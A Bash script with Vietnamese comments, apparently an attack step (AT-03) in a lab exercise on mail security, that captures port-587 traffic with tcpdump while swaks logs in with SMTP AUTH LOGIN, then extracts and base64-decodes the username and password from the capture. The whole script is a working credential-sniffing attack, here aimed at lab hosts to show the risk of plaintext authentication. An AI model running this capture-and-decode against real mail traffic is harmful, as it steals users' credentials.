#!/usr/bin/env bash
# AT-03  Danh cap mat khau SMTP AUTH qua kenh ban ro - chay tren vm-client
#   sudo bash attacks/at03-credential-theft.sh
# May client dang nhap vao cong 587 cua mail1 bang tai khoan THAT (giamdoc).
# tcpdump tren may client luu lai doan 'AUTH LOGIN' -> base64 -> mat khau roi.
set -uo pipefail   # KHONG dung -e: 5xx/RCPT bi tu choi la KET QUA do duoc, khong phai loi script

EVID=/root/evidence/client; mkdir -p "$EVID"
PCAP="$EVID/at03-auth587.pcap"
TXT="$EVID/at03-credentials.txt"
rm -f "$PCAP"

echo "[1] Goi tui cong 587"
tcpdump -i any -nn -s0 -w "$PCAP" 'tcp port 587' >/dev/null 2>&1 &
DPID=$!
sleep 2

echo "[2] Dang nhap SMTP AUTH tu may client (tu tai khoan hop le giamdoc@congtyA.test)"
swaks --server mail1.congtyA.test --port 587 \
      --from    "giamdoc@congtyA.test" \
      --to      "ketoan@congtyB.test" \
      --auth    LOGIN \
      --auth-user     giamdoc \
      --auth-password 'Lab@2026' \
      --header  "Subject: Len hop - AT-03 co AUTH tren duong truyen" \
      --body    "Noi dung nay cung di ban ro." 2>&1 | tee "$EVID/at03-swaks.log"

sleep 2
kill "$DPID" 2>/dev/null || true
sleep 1

echo
echo "[3] Trich xuat doan AUTH va dao base64"
{
  echo "# time $(date -u '+%F %T') UTC - pcap: $PCAP"
  echo "--- EHLO cua mail1 co quan bo AUTH khong? ---"
  tcpdump -r "$PCAP" -A -nn 2>/dev/null | grep -a -E '250-AUTH|250 AUTH' | sed 's/^/  /'
  echo "--- Doan giua 'AUTH LOGIN' va 235 ---"
  tcpdump -r "$PCAP" -A -nn 2>/dev/null | awk '/AUTH LOGIN/{f=1} f{print} /235 /{f=0}' | sed 's/^/  /'
  echo "--- Hai chuoi base64 lien tiep sau '334' ---"
  B64=$(tcpdump -r "$PCAP" -A -nn 2>/dev/null | grep -aoE '[A-Za-z0-9+/]{8,}={1,2}' | sort -u || true)
  echo "$B64" | sed 's/^/  /'
  echo "--- Dao ma ---"
  for c in $B64; do printf '  %s  ->  %s\n' "$c" "$(printf '%s' "$c" | base64 -d 2>/dev/null; echo)"; done
} | tee "$TXT"

echo
echo
